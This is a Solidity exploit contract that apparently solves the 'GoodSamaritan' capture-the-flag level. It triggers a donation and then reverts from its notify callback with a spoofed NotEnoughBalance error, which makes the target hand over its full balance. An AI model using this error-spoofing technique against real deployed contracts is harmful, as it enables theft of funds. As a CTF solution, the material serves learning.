// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GoodSamaritan{
    function requestDonation() external returns (bool);
}

contract Solve {
    address target;

    error NotEnoughBalance();

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        GoodSamaritan(target).requestDonation();
    }

    function notify(uint256 _amount) external {
        if (_amount != 10 ** 6)
            revert NotEnoughBalance();
    }
}
